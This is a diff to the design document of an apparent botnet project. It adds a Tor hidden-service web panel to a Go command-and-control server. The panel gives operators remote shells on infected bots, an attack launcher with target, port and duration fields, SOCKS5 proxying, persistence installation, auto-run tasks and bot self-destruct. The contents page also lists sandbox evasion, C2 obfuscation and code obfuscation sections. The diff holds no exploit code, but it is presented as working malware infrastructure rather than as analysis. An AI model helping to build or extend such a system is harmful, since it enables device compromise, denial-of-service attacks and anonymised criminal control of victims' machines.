@@ -10,66 +10,68 @@
 4. [CNC Authentication Protocol](#cnc-authentication-protocol)
 5. [CNC Command Dispatch & Routing](#cnc-command-dispatch--routing)
 6. [CNC User Interface (TUI)](#cnc-user-interface-tui)
-7. [CNC User Permission Model (RBAC)](#cnc-user-permission-model-rbac)
-8. [CNC Bot Connection Management](#cnc-bot-connection-management)
+7. [CNC Web Panel (Tor)](#cnc-web-panel-tor)
+8. [CNC User Permission Model (RBAC)](#cnc-user-permission-model-rbac)
+9. [CNC Bot Connection Management](#cnc-bot-connection-management)
 
 ### Bot Agent Architecture
-9. [Bot High-Level Architecture](#bot-high-level-architecture)
-10. [Bot C2 Obfuscation & Encryption](#bot-c2-obfuscation--encryption)
-11. [Bot TLS Transport Layer](#bot-tls-transport-layer)
-12. [Bot Authentication Protocol](#bot-authentication-protocol)
-13. [Bot Lifecycle & Connection Flow](#bot-lifecycle--connection-flow)
-14. [Bot Attack Capabilities](#bot-attack-capabilities)
-15. [Bot SOCKS5 Proxy & Relay Architecture](#bot-socks5-proxy--relay-architecture)
-16. [Bot Persistence Mechanisms](#bot-persistence-mechanisms)
-17. [Bot Anti-Analysis & Sandbox Detection](#bot-anti-analysis--sandbox-detection)
-18. [Bot DNS Resolution Chain](#bot-dns-resolution-chain)
+10. [Bot High-Level Architecture](#bot-high-level-architecture)
+11. [Bot C2 Obfuscation & Encryption](#bot-c2-obfuscation--encryption)
+12. [Bot TLS Transport Layer](#bot-tls-transport-layer)
+13. [Bot Authentication Protocol](#bot-authentication-protocol)
+14. [Bot Lifecycle & Connection Flow](#bot-lifecycle--connection-flow)
+15. [Bot Attack Capabilities](#bot-attack-capabilities)
+16. [Bot SOCKS5 Proxy & Relay Architecture](#bot-socks5-proxy--relay-architecture)
+17. [Bot Persistence Mechanisms](#bot-persistence-mechanisms)
+18. [Bot Anti-Analysis & Sandbox Detection](#bot-anti-analysis--sandbox-detection)
+19. [Bot DNS Resolution Chain](#bot-dns-resolution-chain)
 
 ### Build & Infrastructure
-19. [Project Structure](#project-structure)
-20. [Build Pipeline & Cross-Compilation](#build-pipeline--cross-compilation)
-21. [Setup Automation](#setup-automation)
-22. [Naming Convention (Code Obfuscation)](#naming-convention-code-obfuscation)
+20. [Project Structure](#project-structure)
+21. [Build Pipeline & Cross-Compilation](#build-pipeline--cross-compilation)
+22. [Setup Automation](#setup-automation)
+23. [Naming Convention (Code Obfuscation)](#naming-convention-code-obfuscation)
 
 ---
 ## CNC Server Architecture
 
 ### CNC High-Level Architecture
 ```
-┌─────────────────────────────────────────────────────────────┐
-│                          OPERATOR                           │
-│  ┌──────────────┐         ┌──────────────────────┐         │
-│  │ Bubble Tea   │         │     Telnet CLI       │         │
-│  │   TUI        │   OR    │   (--split mode)     │         │
-│  │ (local)      │         │                      │         │
-│  └──────┬───────┘         └─────────┬────────────┘         │
-│         │                           │                      │
-│         ▼                           ▼                      │
-│  ┌──────────────────────────────────────────┐              │
-│  │          CNC SERVER (Go)                 │              │
-│  │  ┌──────────┐ ┌──────────┐ ┌────────┐   │              │
-│  │  │ Bot Mgmt │ │ Auth/TLS │ │ RBAC   │   │              │
-│  │  │          │ │          │ │        │   │              │
-│  │  └──────────┘ └──────────┘ └────────┘   │              │
-│  │    TLS 1.2+ on port 443                 │              │
-│  └──────────────────┬───────────────────────┘              │
-│                     │                                      │
-└─────────────────────┼──────────────────────────────────────┘
-                      │ TLS 1.2/1.3 (port 443)
-        ┌─────────────┼───────────────┐
-        ▼             ▼               ▼
-   ┌─────────┐   ┌─────────┐   ┌─────────┐
-   │  Bot    │   │  Bot    │   │  Bot    │
-   │ (ARM64) │   │ (amd64) │   │ (MIPS)  │
-   └─────────┘   └─────────┘   └─────────┘
+┌──────────────────────────────────────────────────────────────────────────────┐
+│                                   OPERATOR                                   │
+│  ┌──────────────┐   ┌──────────────────────┐   ┌─────────────────────────┐  │
+│  │ Bubble Tea   │   │     Telnet CLI       │   │   Tor Web Panel         │  │
+│  │   TUI        │   │   (--split mode)     │   │   (.onion WebSocket)    │  │
+│  │ (local)      │   │                      │   │   (--web mode)          │  │
+│  └──────┬───────┘   └─────────┬────────────┘   └────────────┬────────────┘  │
+│         │                     │                              │               │
+│         ▼                     ▼                              ▼               │
+│  ┌───────────────────────────────────────────────────────────────────────┐   │
+│  │                        CNC SERVER (Go)                               │   │
+│  │  ┌──────────┐ ┌──────────┐ ┌────────┐ ┌──────────────────────────┐   │   │
+│  │  │ Bot Mgmt │ │ Auth/TLS │ │ RBAC   │ │ Embedded Tor Hidden Svc  │   │   │
+│  │  │          │ │          │ │        │ │ (onion + WebSocket)      │   │   │
+│  │  └──────────┘ └──────────┘ └────────┘ └──────────────────────────┘   │   │
+│  │    TLS 1.2+ on port 443                                             │   │
+│  └──────────────────────────────┬──────────────────────────────────────┘   │
+│                                 │                                          │
+└─────────────────────────────────┼──────────────────────────────────────────┘
+                                  │ TLS 1.2/1.3 (port 443)
+                    ┌─────────────┼───────────────┐
+                    ▼             ▼               ▼
+               ┌─────────┐   ┌─────────┐   ┌─────────┐
+               │  Bot    │   │  Bot    │   │  Bot    │
+               │ (ARM64) │   │ (amd64) │   │ (MIPS)  │
+               └─────────┘   └─────────┘   └─────────┘
 ```
 
-**Two Operating Modes:**
+**Three Operating Modes:**
 - **TUI Mode** (default): Local Bubble Tea terminal UI with dashboard, bot list, attack builder
 - **Split Mode** (`--split`): Telnet-based CLI on configurable port for remote admin access
+- **Web Mode** (`--web`): Tor hidden service serving a WebSocket-powered web dashboard over `.onion` -- no clearnet exposure
 
 ### CNC Server Implementation
-**Dual Listener Design:**
+**Multi-Listener Design:**
 ```
 CNC Server
 ├── TLS Listener (0.0.0.0:443) ← Bot connections
@@ -80,10 +82,18 @@ CNC Server
     ├── TUI Mode (default) ← Bubble Tea local UI
     │   └── StartTUI() ← Dashboard, bot list, attack builder
     │
-    └── Split Mode (--split) ← Plain TCP listener
-        ├── Telnet negotiation
-        ├── "spamtec" handshake
-        └── handleRequest() ← Per-user command loop
+    ├── Split Mode (--split) ← Plain TCP listener
+    │   ├── Telnet negotiation
+    │   ├── "spamtec" handshake
+    │   └── handleRequest() ← Per-user command loop
+    │
+    └── Web Mode (--web) ← Embedded Tor hidden service
+        ├── Tor bootstrap (tor.Start with embedded binary)
+        ├── .onion address generation ← printed on startup
+        ├── HTTP server on localhost (Tor-only, no clearnet)
+        │   ├── Static assets (HTML/CSS/JS) via embed.FS
+        │   └── WebSocket endpoint (/ws) ← operator shell + live events
+        └── forwardBotOutputToWebShells() ← routes bot output to WS clients
 ```
 
 ### CNC TLS Transport Layer
@@ -153,8 +163,10 @@ CNC receives → handleBotConnection()
     │
     ├── Decode Base64
     ├── Forward to TUI (ShellOutputMsg) if TUI mode
-    └── Forward to user (forwardBotResponseToUser) if split mode
-        └── Uses commandOrigin map to route to correct user
+    ├── Forward to user (forwardBotResponseToUser) if split mode
+    │   └── Uses commandOrigin map to route to correct user
+    └── Forward to Web Panel (forwardBotOutputToWebShells) if web mode
+        └── Pushes output to all connected WebSocket clients via JSON message
 ```
 
 ### CNC User Interface (TUI)
@@ -173,6 +185,43 @@ CNC receives → handleBotConnection()
 - Real-time bot list updates
 - ANSI color support
 - Confirmation prompts for dangerous commands (persist, reinstall, kill)
+
+### CNC Web Panel (Tor)
+The web panel provides a full-featured operator dashboard accessible exclusively via a Tor hidden service. No clearnet ports are opened -- the embedded Tor process generates a `.onion` address on startup and all traffic is routed through the Tor network.
+
+**Transport:**
+- Embedded Tor hidden service (`.onion`) -- no clearnet exposure
+- WebSocket-powered remote shell for real-time bidirectional communication
+- Static assets (HTML/CSS/JS) served via Go `embed.FS`
+
+**Dashboard Tabs:**
+| Tab | Key | Description |
+|-----|-----|-------------|
+| Bots | `1` | Live bot table with ID, IP, arch, RAM, CPU, uptime; double-click or right-click a row for bot management popup |
+| Shell | `2` | WebSocket-powered remote shell with file browser, breadcrumb navigation, and post-exploit shortcut buttons |
+| Attack | `3` | Attack launcher with method picker, target/port/duration form, and confirmation dialog |
+| SOCKS5 | `4` | Live SOCKS5 dashboard with real-time SSE status updates for relay and direct proxy sessions |
+| Tasks | `5` | Task manager for persistent auto-execute commands that run on bot connect |
+| Users | `6` | User management panel (add, edit, remove, set permission level and expiry) |
+
+**Bot Management Popup (double-click or right-click a bot row):**
+- Open remote shell session
+- Start / stop SOCKS5 proxy
+- Assign bot to a group
+- View bot info (arch, RAM, CPU, uptime, IP)
+- Install full persistence (`!persist`)
+- Kill bot (`!kill` -- self-destruct and cleanup)
+
+**Activity Feed:**
+- Real-time event stream showing bot join, leave, and command events
+- Delivered to connected WebSocket clients as they occur
+
+**Keyboard Shortcuts:**
+| Key | Action |
+|-----|--------|
+| `1`-`6` | Switch between dashboard tabs |
+| `/` | Focus search / filter bar |
+| `?` | Show keyboard shortcut help overlay |
 
 ### CNC User Permission Model (RBAC)
 **Permission Levels (Low → High):**
